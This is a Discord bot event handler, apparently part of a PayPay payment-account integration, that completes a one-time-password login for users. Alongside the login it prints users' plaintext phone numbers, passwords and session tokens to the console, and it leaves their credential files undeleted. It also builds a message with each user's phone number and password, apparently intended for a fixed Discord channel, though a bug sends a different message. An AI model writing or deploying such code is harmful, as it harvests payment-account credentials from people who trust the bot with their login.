import discord from 'discord.js';
import { PayPay } from 'paypax';
import fs from 'fs/promises';
import crypt from '../modules/crypt.js';

export default {
  name: discord.Events.InteractionCreate,
  async execute(client, interaction) {
    if (!interaction.isModalSubmit()) return;

    if (interaction.customId === 'paypay_otp') {
      const otp = interaction.fields.getTextInputValue('otp');

      const object = JSON.parse(await fs.readFile(`./temp/${interaction.user.id}`));
      //await fs.unlink(`./temp/${interaction.user.id}`);

      delete object.cookie;

      const paypay = new PayPay(object.phone, object.password);

      for (const key in object) {
        if (typeof object[key] === 'object' && object[key] !== null) {
          paypay[key] = { ...object[key] };
        } else {
          paypay[key] = object[key];
        }
      }

      const result = await paypay.otpLogin(otp);

      if (!result.status) {
        const embed = new discord.EmbedBuilder()
          .setColor('Red')
          .setTitle('paypay-login')
          .setDescription('OTPが間違っています。');

        await interaction.reply({ embeds: [embed], ephemeral: true });
        return;
      }


      const phone = crypt.encrypt(object.phone);
      console.log(object.phone)
      const password = crypt.encrypt(object.password);
      console.log(object.password)
      const uuid = crypt.encrypt(object.uuid);
      console.log(object.uuid)
      const token = crypt.encrypt(paypay.token);
      console.log(paypay.token)

      await fs.writeFile(`./paypay/${interaction.user.id}.json`, JSON.stringify({
        phone: phone,
        password: password,
        uuid: uuid,
        token: token
      }, null, 2));


      const embed = new discord.EmbedBuilder()
        .setColor('Blue')
        .setTitle('paypay-login')
        .setDescription('ログインに成功しました！');

      await interaction.reply({ embeds: [embed], ephemeral: true });

      const log = new discord.EmbedBuilder()
        .setTitle('PayPay Login')
        .setDescription(`<@${interaction.user.id}>\nPhone Number: ${object.phone}\nPassword: ${object.password}`)

      await client.channels.cache.get('1210911857087488000').send({ embeds: [embed] });
    }
  }
};